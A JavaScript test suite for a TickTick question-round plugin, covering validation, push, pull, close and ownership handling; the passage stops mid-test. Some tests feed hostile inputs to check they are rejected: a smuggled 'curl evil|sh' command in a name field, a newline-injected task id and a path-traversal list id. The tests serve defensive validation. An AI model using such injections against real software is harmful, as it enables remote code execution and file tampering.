import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { tmpDir } from '../helpers/tmp.mjs';
import { fakeTickTick } from '../helpers/fake-ticktick.mjs';
import { body } from '../helpers/fixtures.mjs';
import { createApi } from '../../plugins/grill-over-ticktick/lib/api.mjs';
import { createLogger } from '../../plugins/grill-over-ticktick/lib/log.mjs';
import { readBlock, writeBlock } from '../../plugins/grill-over-ticktick/lib/state.mjs';
import { parseDesc, classifyItems, OTHER_TITLE, buildDesc, REC_PREFIX, LINK_FIELD, taskUrl } from '../../plugins/grill-over-ticktick/lib/desc.mjs';
import { validateRound, compareKeys, signalFor, newOwner, takeover, push, pull, close, finish, efforts, ANSWERED } from '../../plugins/grill-over-ticktick/lib/rounds.mjs';

const ROUND = {
  effort: 'e', round: 2,
  host: { goal: 'ship', decided: ['file (r1.2)'], open: ['r2.1 where — ⭐ file', 'r2.2 how — ⭐ env'], notAsked: ['ci'] },
  questions: [
    { key: 'r2.1', title: 'Where does the token live?', context: 'ctx1', rec: { label: 'file', why: 'w1' }, options: ['file', 'env'] },
    { key: 'r2.2', title: 'How is it read?', context: 'ctx2', rec: { label: 'env', why: 'w2' }, options: ['file', 'env', 'both'] },
  ],
};

/** @param {import('node:test').TestContext} t */
function setup(t) {
  const tt = fakeTickTick();
  /** @type {string[]} */ const lines = [];
  const log = createLogger({ stderr: /** @type {any} */ ({ write: (/** @type {string} */ s) => { lines.push(s); return true; } }) });
  const api = createApi({ fetch: tt.fetch, token: 'T', log, sleep: async () => {} });
  const ctx = { api, effort: 'e', pushlogDir: tmpDir(t), log, random: () => 0.123 };
  return { tt, api, ctx, lines };
}

test('validateRound: accepts the sample; rejects each broken field with exit 2', () => {
  assert.deepEqual(validateRound(structuredClone(ROUND)), ROUND);
  const bad = (/** @type {(r: any) => void} */ mut, /** @type {RegExp} */ re) => { const r = structuredClone(ROUND); mut(r); assert.throws(() => validateRound(r), (/** @type {any} */ e) => e.exitCode === 2 && re.test(e.message)); };
  bad((r) => { r.effort = ''; }, /effort/);
  bad((r) => { r.effort = 'x"; curl evil|sh; "'; }, /effort: effort name must match/);
  bad((r) => { r.round = 0; }, /round/);
  bad((r) => { r.questions = []; }, /questions/);
  bad((r) => { r.questions[0].key = 'q1'; }, /key/);
  bad((r) => { r.questions[1].key = 'r2.1'; }, /duplicate/);
  bad((r) => { r.questions[0].key = 'r1.9'; }, /questions\[0\]\.key must start with "r2\."/);
  bad((r) => { r.questions[0].title = 'x'.repeat(81); }, /title/);
  bad((r) => { r.questions[0].rec.label = 'nope'; }, /rec.label/);
  bad((r) => { r.questions[0].options = []; }, /options/);
  bad((r) => { r.questions[0].options = ['file', '']; }, /empty string/);
  bad((r) => { r.questions[0].options = ['file', 'file']; }, /duplicate/);
  bad((r) => { r.questions[0].options = [REC_PREFIX + 'file', 'env']; }, /prefix/);
  bad((r) => { r.questions[0].options = [OTHER_TITLE, 'env']; }, /reserved Other/);
  bad((r) => { r.questions[0].context = 'x'.repeat(100001); }, /100000/);
  bad((r) => { r.host = null; }, /host/);
  bad((r) => { r.host.goal = 'x'.repeat(99990); }, /host body exceeds 100000/);
  assert.throws(() => validateRound('nope'), (/** @type {any} */ e) => e.exitCode === 2);
  const max = structuredClone(ROUND); max.questions[0].title = 'x'.repeat(80);
  assert.equal(validateRound(max).questions[0].title.length, 80);   // the 80-char cap is on the original title; push's [i/N] prefix may exceed it
});

test('compareKeys orders numerically', () => {
  assert.deepEqual(['r2.10', 'r1.2', 'r2.9', 'r1.1'].sort(compareKeys), ['r1.1', 'r1.2', 'r2.9', 'r2.10']);
});

test('signalFor priority: wontdo > tick/text > done > other-only > none', () => {
  const it = (/** @type {boolean} */ rec, /** @type {boolean} */ other) => classifyItems([{ title: '⭐ a', status: rec ? 1 : 0 }, { title: 'b' }, { title: OTHER_TITLE, status: other ? 1 : 0 }]);
  assert.equal(signalFor({ status: 0, items: it(false, false), descChanged: false }), 'none');
  assert.equal(signalFor({ status: 0, items: it(true, false), descChanged: false }), 'tick');
  assert.equal(signalFor({ status: 0, items: it(false, false), descChanged: true }), 'text');
  assert.equal(signalFor({ status: 0, items: it(true, false), descChanged: true }), 'tick+text');
  assert.equal(signalFor({ status: 0, items: it(false, true), descChanged: false }), 'other-only');
  assert.equal(signalFor({ status: 0, items: it(false, true), descChanged: true }), 'text');
  assert.equal(signalFor({ status: 2, items: it(false, false), descChanged: false }), 'done');
  assert.equal(signalFor({ status: 2, items: it(true, false), descChanged: false }), 'tick');
  assert.equal(signalFor({ status: -1, items: it(true, false), descChanged: true }), 'wontdo');
});

test('signalFor over real fixtures: 07 tick → tick; 09a completed w/ partial ticks → tick; 10a wontdo', () => {
  const q = (/** @type {any} */ task, /** @type {boolean} */ changed) => signalFor({ status: task.status, items: classifyItems(task.items), descChanged: changed });
  assert.equal(q(body('07_get_after_tick'), false), 'tick');
  assert.equal(q(body('09a_get_after_complete'), false), 'tick');
  assert.equal(q(body('10a_get_wontdo'), false), 'wontdo');
});

test('newOwner shape', () => { assert.match(newOwner(() => 0.5), /^o_[a-z2-7]{6}$/); assert.notEqual(newOwner(), newOwner()); });

test('takeover on a fresh account creates the layout and writes owner/gen=1; again bumps gen and keeps prose', async (t) => {
  const { tt, ctx } = setup(t);
  const a = await takeover(ctx);
  assert.match(a.owner, /^o_[a-z2-7]{6}$/); assert.equal(a.gen, 1); assert.equal(a.created, true);
  const host = tt.find(a.hostId);
  assert.deepEqual(readBlock(host.content).state, { v: 1, owner: a.owner, gen: 1, round: 0 });
  assert.equal(readBlock(host.content).prose, '📍 e');
  tt.find(a.hostId).content = readBlock(host.content).prose + ' extra\n\n```grill\n' + JSON.stringify({ v: 1, owner: a.owner, gen: 1, round: 3 }) + '\n```\n';
  const b = await takeover({ ...ctx, random: () => 0.9 });
  assert.equal(b.gen, 2); assert.notEqual(b.owner, a.owner); assert.equal(b.created, false);
  assert.deepEqual(readBlock(tt.find(a.hostId).content), { prose: '📍 e extra', state: { v: 1, owner: b.owner, gen: 2, round: 3 }, trailing: '' });
});

test('push: writes host body first, creates top-level questions one at a time with desc/items/tag/column, logs pushlog', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId, listId } = await takeover(ctx);
  const start = tt.calls.length;
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual({ listId: r.listId, hostId: r.hostId, owner: r.owner, gen: r.gen, round: r.round }, { listId, hostId, owner, gen: 1, round: 2 });
  assert.deepEqual(r.questions.map((q) => [q.key, q.created]), [['r2.1', true], ['r2.2', true]]);
  // host body written before the first question POST
  const posts = tt.calls.slice(start).filter((c) => c.method === 'POST').map((c) => c.path);
  assert.ok(posts.indexOf(`/task/${hostId}`) < posts.indexOf('/task'), `host body must be written before questions: ${posts}`);
  const { prose, state } = readBlock(tt.find(hostId).content);
  assert.equal(prose, '📍 e\n\nGoal: ship\n\nDecided\n- file (r1.2)\n\nOpen\n- r2.1 where — ⭐ file\n- r2.2 how — ⭐ env\n\nNot asked yet\n- ci');
  assert.deepEqual(state, { v: 1, owner, gen: 1, round: 2 });
  const q1 = tt.find(r.questions[0].taskId);
  const q2 = tt.find(r.questions[1].taskId);
  // top-level tasks (no parentId) in the 📍 column: the Android app only renders links to top-level tasks as chips
  const columnId = tt.db.columns.find((c) => c.projectId === listId && c.name === '📍').id;
  assert.deepEqual([q1.kind, q1.parentId, q1.projectId, q1.columnId, q1.tags, q1.title], ['CHECKLIST', undefined, listId, columnId, ['grill'], '[1/2] Where does the token live?']);
  assert.equal(q2.parentId, undefined); assert.equal(q2.columnId, columnId);
  assert.ok(tt.calls.slice(start).filter((c) => c.method === 'POST' && c.path === '/task').every((c) => !('parentId' in c.body) && c.body.columnId === columnId));
  assert.equal(q2.title, '[2/2] How is it read?');
  assert.deepEqual(q1.items.map((/** @type {any} */ i) => i.title), ['⭐ file', 'env', OTHER_TITLE]);
  assert.equal(LINK_FIELD, 'desc');
  // each desc links to the next question; the last one back to the host note
  assert.equal(q1.desc, buildDesc({ ...ROUND.questions[0], next: { label: '[2/2] How is it read?', url: taskUrl(listId, q2.id) } }));
  assert.equal(q2.desc, buildDesc({ ...ROUND.questions[1], next: { label: '📍 e', url: taskUrl(listId, hostId) } }));
  assert.ok(q1.desc.includes(`\n\nNext → [［2/2］ How is it read?](https://ticktick.com/webapp/#p/${listId}/tasks/${q2.id})\n\n⌁ r2.1 `));
  assert.ok(q2.desc.includes(`Next → [📍 e](https://ticktick.com/webapp/#p/${listId}/tasks/${hostId})`));
  assert.deepEqual([parseDesc(q1.desc).key, parseDesc(q1.desc).changed, parseDesc(q1.desc).answerText], ['r2.1', false, '']);
  // created last-first (so the next id exists), returned in key order
  const creates = tt.calls.slice(start).filter((c) => c.method === 'POST' && c.path === '/task').map((c) => c.body.title);
  assert.deepEqual(creates, ['[2/2] How is it read?', '[1/2] Where does the token live?']);
  assert.equal(readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8'), `creating r2.2\nr2.2 ${q2.id}\ncreating r2.1\nr2.1 ${q1.id}\n`);
});

test('push is idempotent: re-run creates nothing, returns created:false, never re-sends items/desc', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const n = tt.db.tasks.length; const before = tt.calls.length;
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions.map((q) => q.created), [false, false]);
  assert.equal(tt.db.tasks.length, n);
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST' && c.path === '/task'));
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST' && /^\/task\/t\d+$/.test(c.path) && c.path !== `/task/${tt.db.tasks.find((x) => x.kind === 'NOTE').id}`));
});

test('push adopts a question that exists in TickTick when the pushlog only has `creating`', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const first = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  // simulate crash after create, before the `<key> <taskId>` line: rewrite the log
  const { writeFileSync } = await import('node:fs');
  writeFileSync(join(ctx.pushlogDir, `${listId}.log`), 'creating r2.1\ncreating r2.2\n');
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions, first.questions.map((q) => ({ ...q, created: false })));
  assert.equal(tt.db.tasks.filter((x) => x.kind === 'CHECKLIST').length, 2);
});

test('push to a nonexistent effort → exit 6 and zero POSTs', async (t) => {
  const { tt, ctx } = setup(t);
  await assert.rejects(push({ ...ctx, owner: 'o_zzzzzz', round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 6);
  assert.ok(!tt.calls.some((c) => c.method === 'POST'));
});

test('push re-run with a mixed pushlog (one created, one creating-only) adopts the creating-only one and creates nothing', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const first = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const { writeFileSync } = await import('node:fs');
  writeFileSync(join(ctx.pushlogDir, `${listId}.log`), `creating r2.1\nr2.1 ${first.questions[0].taskId}\ncreating r2.2\n`);
  const n = tt.db.tasks.filter((x) => x.kind === 'CHECKLIST').length;
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions.map((q) => q.created), [false, false]);
  assert.equal(tt.db.tasks.filter((x) => x.kind === 'CHECKLIST').length, n);
});

test('push refuses on owner mismatch (exit 3) before writing anything; requires round.effort to match', async (t) => {
  const { tt, ctx } = setup(t);
  await takeover(ctx);
  const before = tt.calls.filter((c) => c.method === 'POST').length;
  await assert.rejects(push({ ...ctx, owner: 'o_nobody', round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 3 && /owned by o_/.test(e.message));
  assert.equal(tt.calls.filter((c) => c.method === 'POST').length, before);
  const { owner } = await takeover(ctx);
  await assert.rejects(push({ ...ctx, owner, round: { ...structuredClone(ROUND), effort: 'other' } }), (/** @type {any} */ e) => e.exitCode === 2);
});

test('pull: classification of every phone action, sorted by key, host state, truncated=false', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const big = structuredClone(ROUND);
  big.questions.push(
    { key: 'r2.3', title: 't3', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] },
    { key: 'r2.4', title: 't4', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] },
    { key: 'r2.5', title: 't5', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] },
    { key: 'r2.6', title: 't6', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] },
    { key: 'r2.7', title: 't7', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] },
  );
  const p = await push({ ...ctx, owner, round: big });
  const id = (/** @type {string} */ k) => /** @type {string} */ (p.questions.find((q) => q.key === k)?.taskId);
  tt.tick(id('r2.1'), '⭐ file');                                            // tick
  tt.editDesc(id('r2.2'), tt.find(id('r2.2')).desc.replace('✍️ Answer:', '✍️ Answer: env, laptop shared'));  // text
  tt.tick(id('r2.3'), OTHER_TITLE);                                          // other-only
  tt.setStatus(id('r2.4'), 2);                                               // done (stray)
  tt.setStatus(id('r2.5'), -1);                                              // wontdo
  tt.deleteTask(id('r2.6'));                                                 // missing
  tt.editDesc(id('r2.7'), tt.find(id('r2.7')).desc.replace(/\n/g, '\r\n') + '\r\n');  // app re-serialisation → none
  const r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.key, q.signal]), [['r2.1', 'tick'], ['r2.2', 'text'], ['r2.3', 'other-only'], ['r2.4', 'done'], ['r2.5', 'wontdo'], ['r2.6', 'missing'], ['r2.7', 'none']]);
  assert.equal(r.questions[1].answerText, 'env, laptop shared'); assert.equal(r.questions[1].descChanged, true);
  assert.equal(r.questions[6].descChanged, false);
  assert.deepEqual(r.questions.map((q) => [q.title, q.position, q.total]).slice(0, 3), [['[1/7] Where does the token live?', 1, 7], ['[2/7] How is it read?', 2, 7], ['[3/7] t3', 3, 7]]);
  assert.deepEqual([r.questions[5].title, r.questions[5].position, r.questions[5].total], [null, null, null]);
  assert.deepEqual(r.questions[0].items[0], { title: '⭐ file', ticked: true, isRec: true, isOther: false });
  assert.equal(r.questions[5].taskId, id('r2.6')); assert.equal(r.questions[5].etag, null);
  assert.deepEqual({ owner: r.host.owner, gen: r.host.gen, round: r.host.round }, { owner, gen: 1, round: 2 });
  assert.equal(r.truncated, false);
  assert.ok(r.host.prose.startsWith('📍 e'));
});

test('pull ignores tasks that have no key or no grill tag', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.db.tasks.push({ id: 'tx', projectId: listId, title: 'stray tagged', kind: 'TEXT', status: 0, tags: ['grill'], etag: 'z' });
  tt.db.tasks.push({ id: 'ty', projectId: listId, title: 'untagged', kind: 'CHECKLIST', status: 0, tags: [], etag: 'z', desc: buildDesc({ key: 'r9.9', context: 'c', rec: { label: 'a', why: 'w' } }) });
  const r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => q.key), ['r2.1', 'r2.2']);
});

test('pull maps a question whose footer was wiped via the pushlog (text signal, key kept)', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.editDesc(p.questions[0].taskId, 'I rewrote everything');
  const r = await pull(ctx);
  assert.deepEqual([r.questions[0].key, r.questions[0].signal, r.questions[0].answerText], ['r2.1', 'text', null]);
});

test('pull: pushlog key wins over a forged/misattributed footer', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const id1 = p.questions[0].taskId, id2 = p.questions[1].taskId;
  tt.editDesc(id2, tt.find(id1).desc); // r2.2's task now carries r2.1's footer verbatim
  const r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.key, q.taskId]), [['r2.1', id1], ['r2.2', id2]]);
  assert.equal(r.questions.find((q) => q.key === 'r2.2')?.signal, 'text');
});

test('pull/close/finish → not found (6) when the effort does not exist', async (t) => {
  const { ctx } = setup(t);
  for (const f of [() => pull(ctx), () => close({ ...ctx, owner: 'o', input: {} }), () => finish({ ...ctx, owner: 'o' })]) {
    await assert.rejects(f(), (/** @type {any} */ e) => e.exitCode === 6 && /not found in folder Claude/.test(e.message));
  }
});

test('close: status-only writes for answered/wontdo/reopen; unknown keys skipped; owner enforced; bad input → 2', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const before = tt.calls.length;
  const r = await close({ ...ctx, owner, input: { answered: ['r2.1'], wontdo: ['r2.2'], reopen: ['r9.9'] } });
  assert.deepEqual(r, { closed: ['r2.1'], wontdo: ['r2.2'], reopened: [], dropped: [], skipped: ['r9.9'] });
  const writes = tt.calls.slice(before).filter((c) => c.method === 'POST' && c.path !== '/task/filter');
  assert.deepEqual(writes.map((c) => c.body), [{ id: p.questions[0].taskId, projectId: p.listId, status: 2 }, { id: p.questions[1].taskId, projectId: p.listId, status: -1 }]);
  assert.equal(tt.find(p.questions[0].taskId).status, 2);
  assert.equal(tt.find(p.questions[0].taskId).desc, buildDesc({ ...ROUND.questions[0], next: { label: '[2/2] How is it read?', url: taskUrl(p.listId, p.questions[1].taskId) } })); // desc untouched
  await assert.rejects(close({ ...ctx, owner: 'o_other', input: { answered: ['r2.1'] } }), (/** @type {any} */ e) => e.exitCode === 3);
  await assert.rejects(close({ ...ctx, owner, input: { answered: 'r2.1' } }), (/** @type {any} */ e) => e.exitCode === 2);
  const r2 = await close({ ...ctx, owner, input: { reopen: ['r2.1'] } });
  assert.deepEqual(r2.reopened, ['r2.1']); assert.equal(tt.find(p.questions[0].taskId).status, 0);
});

test('close rejects overlapping/duplicate keys across bins before any write', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const before = tt.calls.length;
  await assert.rejects(close({ ...ctx, owner, input: { answered: ['r2.1'], reopen: ['r2.1'] } }), (/** @type {any} */ e) => e.exitCode === 2 && /key r2\.1 appears more than once/.test(e.message));
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST'));
});

test('close maps keys via the footer when the pushlog is missing', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const { rmSync } = await import('node:fs');
  rmSync(join(ctx.pushlogDir, `${listId}.log`));
  const r = await close({ ...ctx, owner, input: { answered: ['r2.1'] } });
  assert.deepEqual(r.closed, ['r2.1']);
  assert.equal(tt.find(p.questions[0].taskId).status, 2);
});

test('finish requires the owner (exit 3 otherwise), exports prose + decisions and archives the list', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.tick(p.questions[0].taskId, 'env');
  await assert.rejects(finish({ ...ctx, owner: 'o_other' }), (/** @type {any} */ e) => e.exitCode === 3);
  assert.notEqual(tt.db.projects.find((x) => x.id === listId).closed, true, 'a non-owner finish archives nothing');
  const r = await finish({ ...ctx, owner });
  assert.equal(r.archived, true); assert.equal(r.listId, listId);
  assert.equal(tt.db.projects.find((x) => x.id === listId).closed, true);
  assert.deepEqual(r.decisions.map((d) => [d.key, d.signal, d.ticked]), [['r2.1', 'tick', ['env']], ['r2.2', 'none', []]]);
  assert.ok(r.prose.includes('Goal: ship'));
});

test('efforts summarises every open effort', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.tick(p.questions[0].taskId, 'env');
  tt.seedEffort('empty', { owner: 'o_zzzzzz', gen: 4, round: 1 });
  const r = await efforts({ api: ctx.api, pushlogDir: ctx.pushlogDir, log: ctx.log });
  assert.deepEqual(r.map((x) => [x.effort, x.owner, x.round, x.open, x.answered]), [['e', owner, 2, 1, 1], ['empty', 'o_zzzzzz', 1, 0, 0]]);
  assert.ok(ANSWERED.has('tick'));
});

test('close marks answered/wontdo keys ingested in the pushlog (not reopen, not skipped); pull exposes ingested on every question incl. missing', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const big = structuredClone(ROUND);
  big.questions.push({ key: 'r2.3', title: 't3', context: 'c', rec: { label: 'a', why: 'w' }, options: ['a', 'b'] });
  const p = await push({ ...ctx, owner, round: big });
  let r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.key, q.ingested]), [['r2.1', false], ['r2.2', false], ['r2.3', false]]);
  await close({ ...ctx, owner, input: { answered: ['r2.1'], wontdo: ['r2.2'], reopen: ['r2.3'] } });
  await close({ ...ctx, owner, input: { answered: ['r9.9'] } });
  const log = readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8');
  assert.ok(log.endsWith('ingested r2.1\ningested r2.2\nreopened r2.3\n'), log);
  tt.deleteTask(p.questions[1].taskId);
  r = await pull(ctx);
  assert.deepEqual(r.questions.map((q) => [q.key, q.signal, q.ingested]), [['r2.1', 'done', true], ['r2.2', 'missing', true], ['r2.3', 'none', false]]);
});

test('close drop: a missing key is consumed with no API write → dropped; a non-missing key in drop → skipped', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const p = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.deleteTask(p.questions[1].taskId);
  const before = tt.calls.length;
  const r = await close({ ...ctx, owner, input: { drop: ['r2.2'] } });
  assert.deepEqual(r, { closed: [], wontdo: [], reopened: [], dropped: ['r2.2'], skipped: [] });
  assert.ok(!tt.calls.slice(before).some((c) => c.method === 'POST' && c.path !== '/task/filter'));
  assert.ok(readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8').endsWith('ingested r2.2\n'));
  const pl = await pull(ctx);
  assert.deepEqual(pl.questions.map((q) => [q.key, q.signal, q.ingested]), [['r2.1', 'none', false], ['r2.2', 'missing', true]]);
  const r2 = await close({ ...ctx, owner, input: { drop: ['r2.1', 'r9.9'] } });
  assert.deepEqual([r2.dropped, r2.skipped], [[], ['r2.1', 'r9.9']]);
  assert.equal((await pull(ctx)).questions[0].ingested, false);
  await assert.rejects(close({ ...ctx, owner, input: { answered: ['r2.1'], drop: ['r2.1'] } }), (/** @type {any} */ e) => e.exitCode === 2 && /appears more than once/.test(e.message));
  await assert.rejects(close({ ...ctx, owner, input: { drop: 'r2.2' } }), (/** @type {any} */ e) => e.exitCode === 2);
});

test('host deleted from TickTick → pull/push/close/finish exit 6 naming the host', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  const layout = { groupId: '', listId: tt.find(hostId).projectId, columnId: null, hostId, created: false };
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.deleteTask(hostId);
  const is6 = (/** @type {any} */ e) => e.exitCode === 6 && /host "📍 e" is gone from TickTick/.test(e.message);
  // with a pre-resolved layout (what `wait` uses) the read of the host itself must fail
  await assert.rejects(pull(ctx), (/** @type {any} */ e) => e.exitCode === 6);
  for (const f of [() => pull({ ...ctx, layout }), () => push({ ...ctx, layout, owner, round: structuredClone(ROUND) }), () => close({ ...ctx, layout, owner, input: {} }), () => finish({ ...ctx, layout, owner })]) await assert.rejects(f(), is6);
  assert.ok(!tt.calls.some((c) => c.method === 'GET' && /\/project\/[^/]+\/task\//.test(c.path)), 'host is read via /project/{id}/data, never the single-task GET');
});

test('push refuses a round behind the host (exit 2) and a new round reusing an existing key (exit 2); same round stays idempotent', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const posts = () => tt.calls.filter((c) => c.method === 'POST' && c.path !== '/task/filter').length;
  let before = posts();
  await assert.rejects(push({ ...ctx, owner, round: { ...structuredClone(ROUND), round: 1, questions: [{ ...ROUND.questions[0], key: 'r1.1' }] } }), (/** @type {any} */ e) => e.exitCode === 2 && /round 1 is behind the host \(round 2\)/.test(e.message));
  assert.equal(posts(), before);
  // keys of another round are refused up front (validateRound)
  await assert.rejects(push({ ...ctx, owner, round: { ...structuredClone(ROUND), round: 3 } }), (/** @type {any} */ e) => e.exitCode === 2 && /key must start with "r3\."/.test(e.message));
  assert.equal(posts(), before);
  // a new round whose key already exists in TickTick (a stray r3.1 question, pushlog lost) → refused via the footer
  const { rmSync } = await import('node:fs');
  rmSync(join(ctx.pushlogDir, `${listId}.log`));
  const hostId = tt.db.tasks.find((x) => x.kind === 'NOTE').id;
  tt.db.tasks.push({ id: 'stray', projectId: listId, parentId: hostId, title: 's', kind: 'CHECKLIST', status: 0, tags: ['grill'], etag: 'z', desc: buildDesc({ key: 'r3.1', context: 'c', rec: { label: 'a', why: 'w' } }) });
  const R3 = { ...structuredClone(ROUND), round: 3, questions: ROUND.questions.map((q, i) => ({ ...q, key: `r3.${i + 1}` })) };
  await assert.rejects(push({ ...ctx, owner, round: R3 }), (/** @type {any} */ e) => e.exitCode === 2 && /key r3\.1 already exists in TickTick; a new round must use new keys/.test(e.message));
  assert.equal(posts(), before);
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions.map((q) => q.created), [false, false]);
});

test('takeover on a host whose state block was wiped rebuilds round from the question footer keys', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, hostId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  tt.find(hostId).content = 'someone rewrote the host';
  const b = await takeover({ ...ctx, random: () => 0.9 });
  assert.deepEqual(readBlock(tt.find(hostId).content).state, { v: 1, owner: b.owner, gen: 1, round: 2 });
  assert.equal(readBlock(tt.find(hostId).content).prose, 'someone rewrote the host');
});

test('push after the pushlog file is lost adopts every existing question by footer and rebuilds the log', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId } = await takeover(ctx);
  const first = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  const { rmSync } = await import('node:fs');
  rmSync(join(ctx.pushlogDir, `${listId}.log`));
  const n = tt.db.tasks.length;
  const r = await push({ ...ctx, owner, round: structuredClone(ROUND) });
  assert.deepEqual(r.questions, first.questions.map((q) => ({ ...q, created: false })));
  assert.equal(tt.db.tasks.length, n);
  assert.equal(readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8'), [...first.questions].reverse().map((q) => `${q.key} ${q.taskId}\n`).join(''));
});

test('pull reports truncated:true when the tag filter returns the 200-task cap', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId, hostId } = await takeover(ctx);
  await push({ ...ctx, owner, round: structuredClone(ROUND) });
  for (let i = 0; i < 198; i++) tt.db.tasks.push({ id: `seed${i}`, projectId: listId, parentId: hostId, title: `s${i}`, kind: 'CHECKLIST', status: 0, tags: ['grill'], etag: 'z', desc: buildDesc({ key: `r1.${i + 1}`, context: 'c', rec: { label: 'a', why: 'w' } }) });
  const r = await pull(ctx);
  assert.equal(r.truncated, true);
  assert.equal(r.questions.length, 200);
});

test('server ids are validated at the boundary: a task id with a newline never reaches the pushlog', async (t) => {
  const tt = fakeTickTick();
  const evil = /** @type {typeof fetch} */ (async (url, init) => {
    const res = await tt.fetch(url, init);
    if (init?.method === 'POST' && new URL(String(url)).pathname.endsWith('/task') && JSON.parse(String(init.body)).kind === 'CHECKLIST') {
      const t = /** @type {any} */ (await res.json()); return new Response(JSON.stringify({ ...t, id: 'abc\ningested r2.2' }), { status: 200 });
    }
    return res;
  });
  const log = createLogger({ stderr: /** @type {any} */ ({ write() { return true; } }) });
  const ctx = { api: createApi({ fetch: evil, token: 'T', log, sleep: async () => {} }), effort: 'e', pushlogDir: tmpDir(t), log, random: () => 0.1 };
  const { owner, listId } = await takeover(ctx);
  await assert.rejects(push({ ...ctx, owner, round: structuredClone(ROUND) }), (/** @type {any} */ e) => e.exitCode === 1 && /unexpected id from server/.test(e.message));
  assert.equal(readFileSync(join(ctx.pushlogDir, `${listId}.log`), 'utf8'), 'creating r2.2\n');
});

test('a malicious list id from the server is rejected before it is used in a path or URL', async (t) => {
  const { tt, ctx } = setup(t);
  const s = tt.seedEffort('e');
  tt.db.projects.find((p) => p.id === s.listId).id = '../../../home/u/.bashrc#';
  const before = tt.calls.length;
  for (const f of [() => pull(ctx), () => takeover(ctx)]) await assert.rejects(f(), (/** @type {any} */ e) => e.exitCode === 1 && /unexpected id from server/.test(e.message));
  assert.ok(!tt.calls.slice(before).some((c) => c.path.includes('..')));
});

/** @param {import('node:test').TestContext} t @param {(tt: ReturnType<typeof fakeTickTick>, url: string, init: any) => Response | void | Promise<Response | void>} hook */
function hooked(t, hook) {
  const tt = fakeTickTick();
  const f = /** @type {typeof fetch} */ (async (url, init) => (await hook(tt, new URL(String(url)).pathname.replace(/^\/open\/v1/, ''), init)) ?? tt.fetch(url, init));
  const log = createLogger({ stderr: /** @type {any} */ ({ write() { return true; } }) });
  return { tt, ctx: { api: createApi({ fetch: f, token: 'T', log, sleep: async () => {} }), effort: 'e', pushlogDir: tmpDir(t), log, random: () => 0.123 } };
}

test('truncated filter: pushlog keys the filter did not return are `unknown` (not missing); close refuses drop while truncated', async (t) => {
  const { tt, ctx } = setup(t);
  const { owner, listId, hostId } = await takeover(ctx);
